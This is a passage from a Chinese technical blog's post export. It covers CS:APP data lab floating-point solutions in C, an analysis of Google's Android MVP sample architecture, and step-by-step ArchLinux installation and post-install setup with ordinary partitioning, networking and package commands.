如果舍弃的这九位的最高位为1，并且后面的位都是0，这个时候正好就是第9位表示的值的二分之一。那么这个时候我们就要看第9位，如果第9位为0，那么不舍入。如果第9位为1，那么进行舍入，也就是把最终结果加一。 12345678910111213141516171819202122232425262728293031323334353637383940unsigned float_i2f(int x) &#123; int i = 1; int nega = 0; unsigned temp; unsigned result; if (x &amp; 0x80000000) &#123; nega = 1; x = ~x + 1; &#125; if (x == 0) &#123; return 0; &#125; while ((x &amp; 0x80000000) != 0x80000000) &#123; ++i; x &lt;&lt;= 1; &#125; result = x &lt;&lt; 1; temp = result; result &gt;&gt;= 9; if (nega) &#123; result |= 0x80000000; &#125; else &#123; result &amp;= 0x7FFFFFFF; &#125; i = (32 - i) + 127; result = (result &amp; 0x807FFFFF) | (i &lt;&lt; 23); if ((temp &amp; 0x00000100) == 0x00000100) &#123; if (temp &amp; 0x000000FF) &#123; return result + 1; &#125; else &#123; if (result &amp; 1) &#123; return result + 1; &#125; else &#123; return result; &#125; &#125; &#125; return result;&#125; float_twice 要求：返回2*f的位级表示 操作符使用数量限制：30 思路： 如果该浮点数是非规格化的，那么我们需要将它的有效数字部分左移一位就可以达到乘二的效果，这个过程需要注意两个地方，第一是如果左移后如果有效数字的最高位溢出了，那么正好移到了指数部分成为了一个规格化的表示形式，所以我们无需担心左移后有效数字溢出的问题。第二是左移后会导致符号位被移出，我们需要在位移之后手动置上原来的符号位。 如果该浮点数是规格化的，那么我们只需要将它的指数部分加一。 其他情况的应该直接返回原值。 123456789unsigned float_twice(unsigned uf) &#123; unsigned result = uf; if ((uf &amp; 0x7f800000) == 0) &#123; result = ((uf &amp; 0x007fffff) &lt;&lt; 1) | (uf &amp; 0x80000000); &#125; else if ((uf &amp; 0x7f800000) != 0x7f800000) &#123; result = uf + 0x00800000; &#125; return result;&#125; 实验小结作为CS:APP的第一个lab，绝大部分的题目在经过仔细思考与测试后是可以自主完成的，但是其中的bitCount与ilog2由于需要使用分治与二分查找的算法，自己想出来的难度还是比较大的，在卡了两天以后还是去查了答案。","tags":[{"name":"Computer System","slug":"Computer-System","permalink":"https://www.viseator.com/tags/Computer-System/"},{"name":"CS:APP","slug":"CS-APP","permalink":"https://www.viseator.com/tags/CS-APP/"}]},{"title":"Android Google官方MVP架构分析","date":"2017-05-25T12:54:08.000Z","path":"2017/05/25/android_google_mvp/","text":"写在前面关于MVP模式的基本介绍与优缺点可以参见下面这篇文章： https://segmentfault.com/a/1190000003927200 本文的重点是对Google官方写的一个MVP架构实现的Demo进行简单的分析来看看谷歌实现的Android MVP架构是怎么搭建的。 谷歌官方的架构Demo地址： https://github.com/googlesamples/android-architecture 本文所讲解的为： https://github.com/googlesamples/android-architecture/tree/todo-mvp 需要读者参照源码查看本文。 我将这个todo应用的框架提炼出来（同时也意味着丢失了很多的实现细节，但可以将架构看得更加清晰），制作了一张伪UML图（为了简化，没有遵循UML的规范），下面我们参照着表中的内容进行分析： BaseView与BasePresenter可以看到它们是独立于包外的两个基础接口，之后的所有View与Presenter接口都将继承它们，所以应该将一些通用的方法写在这两个Base接口中。 tasks包整个app中tasks、taskdetail、statistics三个包对应着的就是三个Activity，可以看到每一个包中包含了对应的Activity、View 、Presenter与Contract类和其他工具组件，通过这样的方式构成了应用的一个组成单元（每一个Activity与其对应的View和实现逻辑的Presenter）。 图中我只展现了tasks这一个包，其他的包内部的结构也是一样的。 TasksContract接口TasksContract接口包含两个接口，分别是继承了BaseView与BasePresenter的View与Presenter。 我们可以将Contract接口视为管理View与Presenter需要实现的方法的汇总接口，这些方法在实例类中实际上都是通过接口来进行调用的，这样就可以避免依赖于某一个特定类的方法来进行处理，从而可以有多种实现View与Presenter的方式，便于进行单元测试（可以看到源代码中就有很多单元测试的内容，但是在这篇文章中我们将它们忽略）。 一切与更新UI有关的逻辑都应该放在TasksContract.View接口中。 一切与业务有关的逻辑都应该放在TaskContract.Presenter接口中。 TasksFragment与TasksPresenterTasksFragment与TaskPresenter分别是TasksContract.View与TaskContract.Presenter接口的实例。 TaskActivity在初始化时会先创建TasksFragment实例，再将其作为构造参数传递给TaskPresenter，TaskPresenter在构造方法中又会调用TasksFragment的setPresenter方法将自身传递给TasksFragment。这样Presenter与View就分别存有了一份对方的引用。 构造完成后，当用户与UI进行交互，View一律调用Presenter的相关方法来进行交互事件的处理或请求数据更新。如果有新的内容需要呈现在UI上，则由Presenter调用View的相关方法来进行更新。Presenter则负责与上一级的数据存储池进行交互来更新数据或是获取新的数据。 可以看到Presenter充当了一个“中介”，View的所有请求都将交由Presenter进行处理，而View现在需要做的只有提供相应方法供Presenter进行调用，避免了将大量业务逻辑写在View中。同时也避免了View与数据的直接交互，而是由Presenter“单线操作”，降低了耦合度。 Data包Task这里的Task是一个POJO类，用于表示储存的数据。 source包TaskDataSource接口TaskDataSource接口定义了所有可以的用于操作数据的对象的方法，换句话说，无论数据的来源是什么，我们都可以通过调用实现了这个接口的对象的方法来操纵数据。 GetTaskCallback与LoadTasksCallback注意到用于获取数据的方法的参数都利用了callback进行回调来传递数据。这样做主要因为数据的获取有可能是异步的，使用回调机制可以避免线程因为等待数据而阻塞。 local包与remote包这两个包分别存放着一个实现了TaskDataSource接口的类，他们就代表了从本地缓存获取数据与从远端获取数据。当然与获取数据有关的其他类也应该放在这个包下。 TaskRepository有了从本地与远端获取数据的类，那么就应该有一个类对它们进行管理，我们希望的是有本地缓存时读取本地缓存，没有时就从远端的获取数据。在更为复杂的情况下，我们需要处理来自远端的请求并与本地的数据进行同步。 TaskRepository就是用于管理所有的这些数据来源并统一成一个TaskDataSource暴露给Presenter来操作数据，而这些数据管理逻辑就被隐藏在了TaskRepository中。 值得注意的是，源码中在TaskRepository中还实现了一个内存缓存，可以避免从其他两个低速来源中获取数据。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"MVP","slug":"MVP","permalink":"https://www.viseator.com/tags/MVP/"},{"name":"Architecture","slug":"Architecture","permalink":"https://www.viseator.com/tags/Architecture/"}]},{"title":"ArchLinux安装后的必须配置与图形界面安装教程","date":"2017-05-19T13:38:57.000Z","path":"2017/05/19/arch_setup/","text":"ArchLinux安装后的必须配置在上一篇教程中，我们成功地安装了ArchLinux，这时系统处于一个非常精简的状态，为了日常使用，我们必须进行一些配置、安装一些需要的组件，来扩展我们的系统功能，开源的组件相互协同工作也是Linux的迷人之处之一。 下面的教程部分参考了官方General recommendations。 上述链接中还有很多本文未提及的可以配置的东西，感兴趣的同学可以阅读其中的内容对系统进行更加完善的配置。 连接网络现在我们是在新安装的系统上进行操作，所以我们要重新联网，我们在之前安装系统时已经提前装好了相关的包。所以现在只要跟之前一样： 如果你是有线网并且路由器支持DHCP的话插上网线后先执行以下命令获取IP地址： 1dhcpcd 无线网： 1wifi-menu 按界面提示进行操作就可以了。 如果wifi-menu无法联网，可以尝试下面的方法(来源)： 1sudo systemctl start wpa_supplicant.service 使用nmcli查看Wifi列表： 1nmcli dev wifi list 连接Wifi（注意要带引号）： 1nmcli device wifi connect \"你的Wifi名称\" password \"你的Wifi密码\" 同样可以使用ping命令来测试是否正常联网。 创建交换文件交换文件可以在物理内存不足的时候将部分内存暂存到交换文件中，避免系统由于内存不足而完全停止工作。 之前我们通常采用单独一个分区的方式作为交换分区，现在更推荐采用交换文件的方式，更便于我们的管理。 分配一块空间用于交换文件，执行： 1dd if=/dev/zero of=/swapfile bs=1M count=512 status=progress （请将512换成需要的大小，单位M） 交换文件的大小可以自己决定，推荐4G以下的物理内存，交换文件与物理内存一致，4G以上的物理内存，交换文件4-8G。 更改权限，执行： 1chmod 600 /swapfile 设置交换文件，执行： 1mkswap /swapfile 启用交换文件，执行： 1swapon /swapfile 最后我们需要编辑/etc/fstab为交换文件设置一个入口，使用vim打开文件： 1vim /etc/fstab 注意编辑fstab文件的时候要格外注意不要修改之前的内容，直接在最后新起一行加入以下内容： 1/swapfile none swap defaults 0 0 新建用户在这之前所有操作都是以root用户的身份进行的，由于root的权限过高，日常使用root用户是不安全的。Linux为我们提供了强大的用户与组的权限管理，提高了整个系统的安全性。这里我们就来新建一个用户。 执行以下命令来创建一个名为username的用户（请自行替换username为你的用户名）： 1useradd -m -G wheel username （请自行替换username为你的用户名） 在这里稍微解释一下各参数的含义： -m：在创建时同时在/home目录下创建一个与用户名同名的文件夹，这个目录就是你的家目录啦！家目录有一个别名是~，你可以在任何地方使用~来代替家目录路径。这个神奇的目录将会用于存放你所有的个人资料、配置文件等所有跟系统本身无关的资料。这种设定带来了诸多优点： 只要家目录不变，你重装系统后只需要重新安装一下软件包（它们一般不存放在家目录），然后所有的配置都会从家目录中读取，完全不用重新设置软件着。 你可以在家目录不变的情况下更换你的发行版而不用重新配置你的环境。 切换用户后所有的设置会从新的用户的家目录中读取，将不同用户的资料与软件设置等完全隔离。 有些著名的配置文件比如vim的配置文件~/.vimrc，只要根据自己的使用习惯配置一次， 在另一个Linux系统下（例如你的服务器）把这个文件复制到家目录下，就可以完全恢复你的配置。 -G wheel：-G代表把用户加入一个组，对用户与组的概念感兴趣的同学可以自行查找有关资料学习。后面跟着的wheel就是加入的组名，至于为什么要加入这个组，后面会提到。 当然记得为新用户设置一个密码，执行如下命令： 1passwd username （请自行替换username为你的用户名） 根据提示输入两次密码就可以了，注意，这是你的用户密码，推荐与之前设置的root用户的密码不同。 配置sudo我们已经创建好了一个新的用户，以后我们将会使用这个用户来登录，那么如果我们需要执行一些只有root用户才能执行的命令（例如修改系统文件、安装软件包）怎么办？当然我们可以通过 1su 命令来切换到root用户执行命令后再通过 1exit 返回普通用户。 但是sudo为我们提供了一个更快捷的办法，使用sudo，我们只要在需要root权权限执行的命令之前加上sudo就可以了，例如安装软件包： 1sudo pacman -S something 下面我们就来安装并配置sudo。 sudo本身也是一个软件包，所以我们需要通过pacman来安装： 1pacman -S sudo 接下来我们需要用专门的visudo命令来编辑sudo的配置文件（前面这句是为了创建vim到vi的软链接避免找不到vi编辑器）： 12ln -s /usr/bin/vim /usr/bin/vivisudo 实际上就是vim的操作，使用它是为了对编辑后的文件进行检查防止格式的错误。 找到 1# %wheel ALL=(ALL)ALL 这行，去掉之前的#注释符，保存并退出就可以了。 这里的%wheel就是代表wheel组，意味着wheel组中的所有用户都可以使用sudo命令。 当然为了安全使用sudo命令还是需要输入当前用户的密码的。 配置好sudo以后，我们进行一次重启，执行： 1reboot 来重启你的电脑。 重启以后输入你刚创建的用户名与密码来登录。注意登录后要重新进行联网操作。 图形界面的安装显卡驱动的安装 参照这个表格，安装相应的包，比如你是intel的集成显卡（绝大多数人的情况），执行： 1sudo pacman -S xf86-video-intel 提示：Nvidia的独显驱动如非必要，建议只装集成显卡的驱动（省电，如果同时装也会默认使用集成显卡），不容易出现冲突问题。相反，如果集成显卡驱动有问题无法装上，可以装独显驱动，具体的版本请到下面的链接查询： https://wiki.archlinux.org/index.php/Xorg#Driver_installation 安装XorgXorg是Linux下的一个著名的开源图形服务，我们的桌面环境需要Xorg的支持。 执行如下命令安装Xorg及相关组件： 1sudo pacman -S xorg 安装桌面环境Linux下有很多著名的桌面环境如Xfce、KDE(Plasma)、Gnome、Unity、Deepin等等，它们的外观、操作、设计理念等各方面都有所不同， 在它们之间的比较与选择网上有很多的资料可以去查。 在这里我们选择笔者使用的Xfce和非常流行的KDE(Plasma)作为示范，当然你也可以把它们全部装上换着用……因为Linux的模块化，这样完全没有问题。 更多桌面环境的安装指南请见下面的链接： https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments 安装Xfce直接安装软件包组（包含了很多软件包）即可： 1sudo pacman -S xfce4 xfce4-goodies 安装KDE(Plasma)直接安装软件包组（包含了很多软件包）即可： 1sudo pacman -S plasma kde-applications 安装桌面管理器安装好了桌面环境包以后，我们需要安装一个图形化的桌面管理器来帮助我们登录并且选择我们使用的桌面环境，这里我推荐使用sddm。 安装sddm执行： 1sudo pacman -S sddm 设置开机启动sddm服务这里就要介绍一下Arch下用于管理系统服务的命令systemctl了，服务的作用就是字面意思，为我们提供特定的服务，比如sddm就为我们提供了启动xorg与管理桌面环境的服务。 命令的使用并不复杂： 1234sudo systemctl start 服务名 （启动一项服务）sudo systemctl stop 服务名 （停止一项服务）sudo systemctl enable 服务名 （开机启动一项服务）sudo systemctl disable 服务名 （取消开机启动一项服务） 所以这里我们就执行下面命令来设置开机启动sddm： 1sudo systemctl enable sddm 提前配置网络到现在我们已经安装好了桌面环境，但是还有一件事情需要我们提前设置一下。由于我们之前使用的一直都是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以我们需要禁用netctl并启用NetworkManager： 12sudo systemctl disable netctlsudo systemctl enable NetworkManager （注意大小写） 同时你可能需要安装工具栏工具来显示网络设置图标（某些桌面环境已经装了，但是为了保险可以再装一下）： 1sudo pacman -S network-manager-applet 这样开机以后我们就可以在图形界面下配置我们的网络啦。 重新启动后，如果你看到桌面管理器的界面，选择你需要的桌面环境并输入用户名与密码登陆后，看到了熟悉而又陌生的桌面，那么恭喜你，你已经完成了桌面环境的安装！ 你可能需要知道的操作与软件包推荐到这里，ArchLinux的安装与基本配置教程已经结束了，笔者在编写过程中基本凭着多次安装的经验与这次安装的记录完成，难免会有疏漏与不正确的地方，还请大家通过下面的评论或邮件(viseator@gmail.com)提出意见与建议。也欢迎你们与我交流安装的问题。 下一篇文章介绍了一些实用的配置（如中文输入法的安装）与软件包等。 最后如果觉得这篇教程对你有帮助，可以移步我的知乎回答下点个赞，让更多的人可以看到这篇教程，你的支持是我最大的动力： Arch Linux 怎么安装？ - viseator的回答 - 知乎 https://www.zhihu.com/question/21427410/answer/171867330 同时，如果你是想要从事计算机方向的新人，非常推荐看看我的分享：： 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 也欢迎关注我的微信公众号VirMe： 如果安装过程中遇到问题，可以直接在下方评论区/公众号留言或邮件viseator@gmail.com（尽量附上错误信息），我会尽力回复解决。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.viseator.com/tags/Linux/"},{"name":"Arch","slug":"Arch","permalink":"https://www.viseator.com/tags/Arch/"}]},{"title":"以官方Wiki的方式安装ArchLinux","date":"2017-05-17T15:26:29.000Z","path":"2017/05/17/arch_install/","text":"写在前面 这可能是你能找到的最适合你的中文ArchLinux安装教程。 前几天硬盘挂了，万幸的是家目录放在了另一块硬盘上所以存活了下来。不得不再重装一遍Arch，算上帮朋友装的，这已经是我第四次安装Arch了。也想借此机会记录这个过程写一篇完全按照官方Wiki指导再加上Wiki上没有重点写出来但是安装过程中会遇到的一些问题的一篇不太一样的安装教程。 很多人提起起Arch的第一反应就是安装困难，这种困难有很多原因，也就是接下来我们将会面对的问题。 没有图形界面的引导：Arch只给我们提供了一个最小的环境，所有的安装操作都需要在命令行中完成，这对于不习惯命令行操作的人来说是最难以跨越的一个坎。许多发行版之所以可以流行开来就是因为他们提供了友好的、流程化的安装过程，这帮很多人解决了学习Linux的第一步：安装一个Linux。 预备知识的不足与缺乏查找并解决问题的能力：一些对于安装系统比较重要的知识例如系统引导、配置文件的编辑、简单的命令行操作等没有接触过，所以操作时往往摸不着头脑，一旦自己的操作结果与教程不符便不知道如何去解决遇到的问题。 缺乏合适的教程：安装Arch最好的也是最完备的教程就是官方的Installation guide与Wiki，虽然部分内容有中文版，但是中文的翻译有些时候会落后于英文版，不推荐完全依赖于中文Wiki。并且官方Wiki的写作方式更偏向于文档，没有我们所习惯的按步骤编排的安装过程，给不熟悉这种写作方式的同学造成了阅读与使用上的困难。国内的可以找到的教程往往都是时间比较久远，或是没有提及或是忽略了一些新手容易犯错误的地方。 本篇教程致力于与现有的Wiki保持一致，并且适当地加入一些适合初学者学习的链接，希望可以让阅读了这篇教程的同学可以提高自己利用现有及以后可能出现的新的Wiki内容的能力。 ArchLinux或者是Linux的优点就不在这里多说了，我相信打开这篇教程的同学一定可以从这样的过程中得到很多。 注意事项请一定仔细阅读教程中的每一个指示，绝大部分安装失败都是由于没有仔细看教程，遗漏、错输指令导致的。安装的方式根据引导方式的不同会有所不同，所以请按教程中的指示进行，切忌一味地输命令而不管说明。 对于硬盘分区相关的操作，请更加小心检查命令，数据无价。 下面就正式开始我们的教程。 安装教程前期准备安装介质在安装之前我们先要准备一个安装介质，在这里只推荐U盘作为安装介质。 到https://www.archlinux.org/download/页面下方的中国镜像源中下载archlinux-**-x86_64.iso这个iso文件。 如果是Linux系统下制作安装介质，推荐使用dd命令，教程： http://www.runoob.com/linux/linux-comm-dd.html 如果是windows系统下制作安装介质，推荐使用usbwriter这款轻量级的工具，下载链接： https://sourceforge.net/projects/usbwriter/ 磁盘准备我们需要有一块空闲的磁盘区域来进行安装，这里的空闲指的是没有被分区的空间。下面来介绍如何准备这块空间。 在windows下空出一块分区来安装：利用windows自带的磁盘管理工具就可以： 右击windows图标，在弹出菜单中选择磁盘管理（其他版本的windows请自行找到打开磁盘管理的方式）： 右击想要删除的分区，选择删除卷（注意这步之后这个分区的所有数据将会丢失）： 在linux下分出一块区域安装：使用fdisk进行，教程请见链接中的删除分区： http://www.liusuping.com/ubuntu-linux/linux-fdisk-disk.html 空闲的磁盘（新磁盘）：不需要进行任何操作。 U盘安装下面的过程实际上都在刚刚准备好的U盘启动介质上的Linux系统下进行，所以启动时都应该选择U盘。 设置启动顺序这一步在不同品牌的电脑上都不一样，所以需要大家自行搜索自己电脑品牌+启动顺序这个关键词来进行设置。 例如我的电脑搜索神舟 启动顺序可以得到如下的结果： https://zhidao.baidu.com/question/170954184.html 一般来说现在的主板都可以不用进入BIOS而快速地切换启动顺序，只要找到相应的快捷键就可以了。 进入U盘下的Linux系统 按上一步设置好启动顺序，启动之后会看到如下界面（UEFI启动方式的界面可能不同）： 如果直接进入windows，请检查启动顺序是否设置成功，U盘是否在制作启动介质时成功写入。 如果没有看到这个界面，请检查U盘是否制作成功，如果多次遇到问题可以考虑换一个U盘。 选择第一个选项。 这时Arch开始加载，你将会看到屏幕显示如下内容： 加载完成后你将会进入一个有命令提示符的界面： 如果出现FAIL或是其他错误信息导致无法启动请自行搜索错误信息来获得解决方法。 这就是Linux的终端界面了，接下来我们将通过在这个界面执行一系列命令来将Arch安装到我们的磁盘上。 下面进行的过程是按照官方Installation guide为依据进行的，出现的任何问题都可以到链接中的相应部分查找原文找到解决方式。 检查引导方式目前的引导方式主要分为EFI引导+GPT分区表与BIOS(LEGACY)引导+MBR分区表两种，几乎比较新的机器都采用了EFI/GPT引导的方式。关于这部分的内容如果有兴趣可以通过这个链接进行了解： http://www.chinaz.com/server/2016/1017/595444.shtml 如果你不知道自己的引导方式，请在命令提示符下执行以下命令： 1ls /sys/firmware/efi/efivars 这里的ls是命令，空格后面的一串为路径，作为ls命令的参数。ls命令的作用是显示路径目录下的所有的文件（夹）。 如果你对命令行下的常用操作（TAB补全、取消命令等）不熟悉，请先学习了解下面部分实用的快捷键或命令： Tab键 命令行自动补全。键入命令或文件名的前几个字符，然后按 [Tab] 键，它会自动补全命令或显示匹配你键入字符的所有命令 ↑(Ctrl+p) 显示上一条命令 ↓(Ctrl+n) 显示下一条命令 Ctrl-C: 终止当前正在执行的命令 输入命令并回车执行后，如果提示 1ls: cannot access '/sys/firmware/efi/efivars': No such file or directory 表明你是以BIOS方式引导，否则为以EFI方式引导。现在只需要记住这个信息，之后这两种\b引导类型的安装方式\b会略有不同（\b下文中涉及到不同的地方请仔细区别）。 更新：\b部分同学反馈这种方式并不\b能\b100%确认你就是\bBIOS方式引导的，更加保险的方法是执行fdisk -l查看分区表，如果你的硬盘（而不是你的U盘）的\bDisklabel type属性为gpt并且有\b\b一个\bType为EFI System的小\b分区（一般为256M左右，如下图），那么你应该是\bEFI引导的。\b 联网arch并不能离线安装，因为我们需要联网来下载需要的组件，所以我们首先要连接网络。 如果你是有线网并且路由器支持DHCP的话插上网线后先执行以下命令获取IP地址： 1dhcpcd 然后执行以下命令来判断网络连接是否正常： 1ping www.baidu.com 如果可以看到类似下面的内容就说明连上了网络： 再次提示用快捷键Ctrl-C可以终止当前正在执行的命令 如果你是无线网，请执行以下命令： 1iwctl 会进入一个以[iwd]开头的命令行环境中，接着执行： 1device list 会列出当前可用的所有网卡设备，如图所示： 记住Name一列你所使用的无线网卡的名称，比如我的就叫wlan0，下面的命令要用到，下面命令中请替换成自己的网卡名称 接着执行下列命令进行无线\b网络的扫描：（wlan0替换成你自己的网卡名称） 1station wlan0 scan 接着执行下列命令列出扫描到的网络：（wlan0替换成你自己的网卡名称） 1station wlan0 get-networks 可以看到当前扫描到的无线网络都展示出来了： 最后输入下列命令连接指定网络：（wlan0替换成你自己的网卡名称，CatAndPomelo替换成你想连的网络名称）： 1station wlan0 connect CatAndPomelo 这时如果网络有密码的话会提示输入密码，输入后回车确认就行： 注意这里就算密码输入错误也不会有提示的，所以请保证密码正确，如果你是中文无线网名称/密码的话建议先改一下，把密码取消会更方便些。 顺利的话，此时你已经连接上网络了，执行下面命令退出iwd： 1quit 连接以后同样可以通过上面的ping命令来进行测试。 iwd是一个实用的命令行下联网工具，利用它可以方便地联网，如果它没能起作用，需要进入以下页面查找解决方式： https://wiki.archlinux.org/index.php/Wireless_network_configuration 注意：由于部分无线网卡驱动的支持并不完善，所以在这里可能会遇到问题，并且各机型的解决方法都不同，如果不幸遇到无线连不上的问题，可以插有线联网先把系统装好再去慢慢解决。解决问题可以参照：https://wiki.archlinux.org/index.php/Network_configuration 更新系统时间执行如下命令： 1timedatectl set-ntp true 正常情况下这样的命令并没有输出，所谓没有消息就是最好的消息 分区与格式化特别注意：涉及到分区与格式化的操作要格外注意，命令在回车之前请再三确认知道自己在做什么，并且没有输错命令，否则将会来带来数据的丢失！如果有需要在操作之前请备份重要的数据。 但是我们也并不要过于惧怕分区与格式化过程，正确操作的情况下不会对你其他数据产生任何影响。 查看目前的分区情况执行命令： 1fdisk -l 以我的电脑为例： 可以看到我的一块238.5g的硬盘(/dev/sda就代表这块硬盘)，下面列出了/dev/sda*这三个分区，/dev/sda3是我存活下来的家目录，可以看到它的类型为Linux分区。注意看Start与End的数值，这个数值代表扇区号，可以理解成硬盘被划分成了一个个小单元，可以直观地看出来在/dev/sda2的End与/dev/sda3的Start之间空出了一大块未分配的空间，接下来我们将分配这块区域。 如果你是BIOS/MBR方式引导，跳过下面创建一个引导分区的步骤。 如果你是EFI/GPT方式引导，并且同时安装了其他系统，那么你应该可以在分区列表中发现一个较小的并且类型为EFI的分区（注意查看硬盘的大小，这个EFI分区有可能是你U盘中的，需要排除），这是你的引导分区，请记下它的路径（/dev/sdxY)备用，跳过下面创建一个引导分区的步骤。 如果你是EFI/GPT方式引导，但是没有这个较小的并且类型为EFI的引导分区（这种情况一般只会出现在新的硬盘），那么你需要先创建一个引导分区。 创建一个引导分区（仅上面所列的第三种情况需要进行这步）执行命令： 1fdisk /dev/sdx （请将sdx替换成你要操作的磁盘如sdb sdc等） 下面你就进入了fdisk的操作环境， 输入m并回车可以查看各命令的作用。 如果你是一块全新的硬盘：输入g来创建一个全新的gpt分区表，否则直接进行第2步。 输入n创建一个新的分区，首先会让你选择起始扇区，一般直接回车使用默认数值即可，然后可以输入结束扇区或是分区大小，这里我们输入+512M来创建一个512M的引导分区。 这时我们可以输入p来查看新创建的分区。 输入t并选择新创建的分区序号来更改分区的类型，输入l可以查看所有支持的类型，输入ef更改分区的类型为EFI。 输入w来将之前所有的操作写入磁盘生效，在这之前可以输入p来确认自己的分区表没有错误。 输入以下命令来格式化刚刚创建的引导分区： 1mkfs.fat -F32 /dev/sdxY （请将sdxY替换为刚创建的分区） 现在引导分区就创建好了。 创建根分区输入命令： 1fdisk /dev/sdx （请将sdx替换成你要操作的磁盘如sdb sdc等） 如果你是一块全新的硬盘（否则直接进行第2步）： 如果你是BIOS/MBR引导方式：输入o来创建一个全新的MBR分区表。 如果你在上一步新建了分区表并创建了引导分区：直接进行步骤2。 如果你在另一块硬盘中已经有引导分区：输入g来创建一个全新的gpt分区表。 输入n创建一个新的分区，首先会让你选择起始扇区，一般直接回车使用默认数值即可，然后可以输入结束扇区或是分区大小，如果我们想要使创建的分区完全占满空闲的空间，可以直接回车使用默认结束扇区。 这时我们可以输入p来查看新创建的分区。 输入w来将之前所有的操作写入磁盘生效，在这之前可以输入p来确认自己的分区表没有错误。 输入以下命令来格式化刚刚创建的根分区： 1mkfs.ext4 /dev/sdxY （请将的sdxY替换为刚创建的分区） 这是我的分区过程供参考： 如果你在分区这步遇到了问题，先看看自己的操作是否与上面的指引一致，如果仍然无法解决可参考https://www.cnblogs.com/freerqy/p/8502838.html这篇文章的“建立硬盘分区”一节尝试使用cfdisk进行分区。 挂载分区执行以下命令将根分区挂载到/mnt： 1mount /dev/sdxY /mnt （请将sdxY替换为之前创建的根分区） 如果你是EFI/GPT引导方式，执行以下命令创建/boot文件夹并将引导分区挂载到上面。BIOS/MBR引导方式无需进行这步。 12mkdir /mnt/bootmount /dev/sdxY /mnt/boot （请将sdxY替换为之前创建或是已经存在的引导分区） 选择镜像源因为从这步开始，需要进行一些编辑配置文件的操作，所以需要掌握一些命令行下非常著名的一款编辑器Vim的基本操作，在这里推荐学习下面这个链接中的存活部分，可以完成编辑、复制粘贴与保存工作即可。 http://coolshell.cn/articles/5426.html 镜像源是我们下载的软件包的来源，我们需要根据自己的地区选择不同的源来加快下载的速度。 执行以下命令，用Vim来编辑/etc/pacman.d/mirrorlist这个文件 1vim /etc/pacman.d/mirrorlist 提示：输入路径时可以用Tab键补全 找到标有China的镜像源，normal模式下按下dd可以剪切光标下的行，按gg回到文件首，按P（注意是大写的）将行粘贴到文件最前面的位置（优先级最高）。 当然也可以直接手工输入。 这里推荐使用清华、浙大源： 12Server &#x3D; http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$archServer &#x3D; http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch 最后记得用:wq命令保存文件并退出。 安装基本包下面就要安装最基本的ArchLinux包到磁盘上了。这是一个联网下载并安装的过程。 执行以下命令： 1pacstrap /mnt base base-devel linux linux-firmware dhcpcd 根据下载速度的不同在这里需要等待一段时间，当命令提示符重新出现的时候就可以进行下一步操作了。 配置Fstab生成自动挂载分区的fstab文件，执行以下命令： 1genfstab -L /mnt &gt;&gt; /mnt/etc/fstab 由于这步比较重要，所以我们需要输出生成的文件来检查是否正确，执行以下命令： 1cat /mnt/etc/fstab 如图，可以看到/dev/sda4被挂载到了根分区。 /dev/sda3是我之前存活下来的家目录被挂载到了/home目录（你们没有这条）。 如果是EFI/GPT引导的还应该有引导分区被挂载到/boot目录。 ChrootChroot意为Change root，相当于把操纵权交给我们新安装（或已经存在）的Linux系统，执行了这步以后，我们的操作都相当于在磁盘上新装的系统中进行。 执行如下命令： 1arch-chroot /mnt 这里顺便说一下，如果以后我们的系统出现了问题，只要插入U盘并启动， 将我们的系统根分区挂载到了/mnt下（如果有efi分区也要挂载到/mnt/boot下），再通过这条命令就可以进入我们的系统进行修复操作。 设置时区依次执行如下命令设置我们的时区为上海并生成相关文件： 12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc 提前安装必须软件包因为我们现在已经Chroot到了新的系统中，只有一些最基本的包（组件），这时候我们就需要自己安装新的包了，下面就要介绍一下ArchLinux下非常强大的包管理工具pacman，大部分情况下，一行命令就可以搞定包与依赖的问题。 安装包的命令格式为pacman -S 包名，pacman会自动检查这个包所需要的其他包（即为依赖）并一起装上。下面我们就通过pacman来安装一些包，这些包在之后会用上，在这里先提前装好。 执行如下命令（注意大小写，大小写错误会导致包无法找到）： 1pacman -S vim dialog wpa_supplicant ntfs-3g networkmanager netctl 一路确认之后包就被成功装上了。 图中只安装了Vim和它的依赖。 设置Locale设置我们使用的语言选项，执行如下命令来编辑/etc/locale.gen文件： 1vim /etc/locale.gen 在文件中找到zh_CN.UTF-8 UTF-8 zh_HK.UTF-8 UTF-8 zh_TW.UTF-8 UTF-8 en_US.UTF-8 UTF-8这四行，去掉行首的#号，保存并退出。如图： 然后执行： 1locale-gen 打开（不存在时会创建）/etc/locale.conf文件： 1vim /etc/locale.conf 在文件的第一行加入以下内容： 1LANG=en_US.UTF-8 保存并退出。 设置主机名打开（不存在时会创建）/etc/hostname文件： 1vim /etc/hostname 在文件的第一行输入你自己设定的一个myhostname 保存并退出。 编辑/etc/hosts文件： 1vim /etc/hosts 在文件末添加如下内容（将myhostname替换成你自己设定的主机名） 123127.0.0.1 localhost::1 localhost127.0.1.1 myhostname.localdomain myhostname 这里我设置的是viseator。 保存并退出。 设置Root密码Root是Linux中具有最高权限帐户，有些敏感的操作必须通过Root用户进行，比如使用pacman，我们之前进行所有的操作也都是以Root用户进行的，也正是因为Root的权限过高，如果使用不当会造成安全问题，所以我们之后会新建一个普通用户来进行日常的操作。在这里我们需要为Root帐户设置一个密码： 执行如下命令： 1passwd 按提示设置并确认就可以了。 或许有的人已经发现官方Wiki和一些其他教程资料中的命令是以#或$开头的，这两个符号就对应着命令行中的命令提示符，#代表以Root用户执行命令，$代表以普通用户执行命令，平时使用教程中的命令时应该注意这一点。 安装Intel-ucode（非IntelCPU可以跳过此步骤）直接pacman安装： 1pacman -S intel-ucode 安装Bootloader经常听说很多人因为引导问题导致系统安装失败，多数是因为教程没有统一或是过时的教程引起的，这里只要按照步骤来其实是不难的。 这里我们安装最流行的Grub2。（如果曾经装过Linux，记得删掉原来的Grub，否则不可能成功启动） 首先安装os-prober和ntfs-3g这两个包，它可以配合Grub检测已经存在的系统，自动设置启动选项。 1pacman -S os-prober ntfs-3g 如果为BIOS/MBR引导方式： 